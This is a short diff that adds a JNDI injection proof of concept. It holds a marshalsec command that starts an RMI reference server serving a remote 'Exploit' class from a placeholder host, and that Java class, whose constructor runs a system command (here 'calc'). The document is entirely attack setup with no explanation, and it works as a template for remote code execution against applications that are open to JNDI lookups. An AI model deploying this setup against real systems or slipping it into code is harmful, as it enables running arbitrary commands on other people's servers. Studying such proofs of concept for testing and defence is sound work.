@@ -1,0 +1,14 @@
+java8 -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://ip/#Exploit
+
+public class Exploit {
+    public Exploit(){
+        try{
+            Runtime.getRuntime().exec("calc");
+        }catch(Exception e){
+            e.printStackTrace();
+        }
+    }
+    public static void main(String[] argv){
+        Exploit e = new Exploit();
+    }
+}
